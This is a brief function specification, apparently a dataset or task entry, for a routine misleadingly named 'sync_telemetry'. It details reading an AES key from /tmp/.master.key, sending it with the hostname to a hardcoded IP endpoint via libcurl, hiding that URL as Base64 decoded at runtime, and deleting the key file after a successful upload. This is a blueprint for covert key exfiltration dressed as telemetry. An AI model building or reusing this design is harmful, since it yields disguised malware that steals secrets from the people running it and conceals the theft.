description: Reads /tmp/.master.key using fopen/fread, extracts aes_key by locating substring "\"aes_key\":\"" using strstr(), advancing pointer by strlen("\"aes_key\":\"") bytes (11 characters), then locating closing quote via strchr(). Validates extracted key length > 0. Obtains hostname via gethostname(). Constructs HTTP POST body as {"aes_key":"...","hostname":"..."} and transmits to http://10.254.19.73:8080/collect via libcurl with Content-Type: application/json. The endpoint URL is stored as a Base64-encoded char array and decoded at runtime using a custom base64_decode() function. If response status code is 200, deletes /tmp/.master.key using remove().
name: sync_telemetry
